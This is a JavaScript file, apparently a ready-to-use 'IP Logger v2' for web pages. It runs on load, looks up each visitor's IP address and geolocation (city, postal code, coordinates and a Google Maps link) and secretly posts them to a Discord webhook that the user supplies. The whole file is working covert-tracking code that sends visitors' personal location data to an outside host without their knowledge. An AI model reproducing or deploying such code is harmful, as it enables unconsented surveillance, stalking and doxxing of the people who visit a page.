const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = ''; //place discord webhook here
                    
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "1pl0gg3r",
                            avatar_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
                            content: "@everyone",
                            embeds: [
                                {
                                    title: "📡 New Visitor Logged",
                                    color: 0x800080,
                                    fields: [
                                        {
                                            name: "🧠 IP Address",
                                            value: `${ipadd}`,
                                            inline: true
                                        },
                                        {
                                            name: "🌍 Location",
                                            value: `**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}`,
                                            inline: true
                                        },
                                        {
                                            name: "📮 Postal & Coords",
                                            value: `**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`
                                        },
                                        {
                                            name: "🗺️ Google Maps",
                                            value: `[📍 View Location](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`
                                        }
                                    ],
                                    thumbnail: {
                                        url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
                                    },
                                    footer: {
                                        text: "IP Logger v2 by ARMed0ps",
                                        icon_url: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
                                    },
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
